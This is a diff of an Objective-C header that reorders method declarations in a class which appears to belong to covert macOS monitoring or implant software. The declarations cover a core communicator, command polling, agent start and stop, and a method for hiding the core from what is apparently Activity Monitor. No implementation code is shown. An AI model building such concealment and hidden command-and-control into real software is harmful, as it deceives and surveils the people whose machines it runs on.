@@ -29,6 +29,19 @@ NSDictionary *getActiveWindowInformationForPID(pid_t pid);
 @interface __m_MInputManager : NSObject
 
 //
+// @abstract
+//  This function will be responsible of communicating with our Core in order
+//  to read the passed configuration and start all the required external agents
+//
++ (void)startCoreCommunicator;
+
++ (void)getSystemVersionMajor: (u_int *)major
+                        minor: (u_int *)minor
+                       bugFix: (u_int *)bugFix;
+
++ (void)hideCoreFromAM;
+
+//
 // @author
 //  revenge
 // @abstract
@@ -40,17 +53,17 @@ NSDictionary *getActiveWindowInformationForPID(pid_t pid);
 // @author
 //  revenge
 // @abstract
-//  Send and receives generic command to/from the core
+//  Check agent at given offset for start/stop/configuration
 //
-+ (void)checkForCommands;
++ (void)checkAgentAtOffset: (uint32_t)offset;
 
 //
 // @author
 //  revenge
 // @abstract
-//  Check agent at given offset for start/stop/configuration
+//  Send and receives generic command to/from the core
 //
-+ (void)checkAgentAtOffset: (uint32_t)offset;
++ (void)checkForCommands;
 
 //
 // @author
@@ -67,19 +80,6 @@ NSDictionary *getActiveWindowInformationForPID(pid_t pid);
 //  This function will detach the app from shared memory upon termination
 //
 + (void)closeThreadCommunicator: (NSNotification *)_notification;
-
-+ (void)hideCoreFromAM;
-
-//
-// @abstract
-//  This function will be responsible of communicating with our Core in order
-//  to read the passed configuration and start all the required external agents
-//
-+ (void)startCoreCommunicator;
-
-+ (void)getSystemVersionMajor: (u_int *)major
-                        minor: (u_int *)minor
-                       bugFix: (u_int *)bugFix;
 
 @end
 
